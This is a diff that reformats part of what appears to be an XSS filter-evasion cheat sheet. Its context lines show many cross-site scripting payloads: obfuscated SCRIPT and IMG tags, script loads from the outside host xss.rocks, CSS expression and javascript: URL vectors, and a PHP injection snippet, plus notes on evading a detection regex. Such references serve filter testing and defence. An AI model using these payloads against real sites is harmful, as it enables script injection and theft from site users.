@@ -494,11 +494,12 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 
 Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc…) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
 
-```js
+```
 <BjsODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 ```
 
 Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.
+
 ```js
 <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
 ```
@@ -513,7 +514,7 @@ Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection eng
 ## No Closing Script Tags
 In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don’t actually need the \></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it’s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they’re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
 
-```js
+```
 <SjsCRIPT SRC=http://xss.rocks/xss.js?< B >
 ```
 
@@ -531,7 +532,7 @@ This particular variant was submitted by Łukasz Pilorz and was based partially 
 - It gets around the following NIDS regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn’t require the end `“>”`. As a side note, this was also affective against a real world XSS filter I came across using an open ended `<IFRAME` tag instead of an `<IMG` tag:
 
 
-```js
+```
 <IjsMG SRC="`('XSS')"`
 ```
 
@@ -802,7 +803,7 @@ Created by Roman Ivanov
 ## IMG STYLE with Expression
 This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:
 
-```js
+```
 exp/*<A STYLE='no\xss:noxss("*//*");
 xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 STYLE Tag (Older versions of Netscape only)
@@ -814,13 +815,15 @@ STYLE Tag using Background-image
 STYLE Tag using Background
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> <STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
 ```
-Anonymous HTML with STYLE Attribute
+
+## Anonymous HTML with STYLE Attribute
 IE6.0 and Netscape 8.1+ in IE rendering engine mode don’t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:
 
 ```js
 <XSS STYLE="xss:expression(alert('XSS'))">
 ```
-Local htc File
+
+## Local htc File
 This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:
 ```js
 <XSS STYLE="behavior: url(xss.htc);">
@@ -902,7 +905,7 @@ c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 DIV Background-image Plus Extra Characters
 Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
 
-```js
+```
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 ```
 
@@ -1004,7 +1007,7 @@ This requires SSI to be installed on the server to use this XSS vector. I probab
 PHP
 Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts ## remotely like this, there are probably much more dire issues:
 
-```js
+``` 
 <? echo('<SCR)';
 echo('IPT>alert("XSS")</SCRIPT>'); ?>
 ```
